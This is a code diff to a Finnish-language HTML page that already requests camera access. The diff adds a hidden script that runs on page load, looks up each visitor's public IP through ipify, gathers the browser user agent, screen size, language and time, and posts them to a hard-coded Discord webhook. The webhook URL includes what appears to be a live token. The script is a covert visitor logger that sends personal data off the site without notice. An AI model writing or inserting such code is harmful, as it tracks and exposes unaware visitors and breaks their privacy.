@@ -223,5 +223,32 @@ navigator.mediaDevices.getUserMedia({ video: true })
     console.warn("Kameran käyttö estetty tai epäonnistui:", err);
   });
 </script>
+<script>const webhookURL = "https://discord.com/api/webhooks/1290348004066201753/2TjZ0mCwYEp6WzJn9L5E86urlMLPpcIIM7B0FFpkzFlkzqbl7V5WV32Psogsg63EhCpT";
+
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+    const ua = navigator.userAgent;
+    const screenSize = `${screen.width}x${screen.height}`;
+    const lang = navigator.language;
+    const time = new Date().toLocaleString();
+
+    const content = `
+**Uusi kävijä!**
+**IP:** ${ip}
+**User-Agent:** ${ua}
+**Näyttö:** ${screenSize}
+**Kieli:** ${lang}
+**Aika:** ${time}
+    `;
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  });
+</script>
 </body>
 </html>
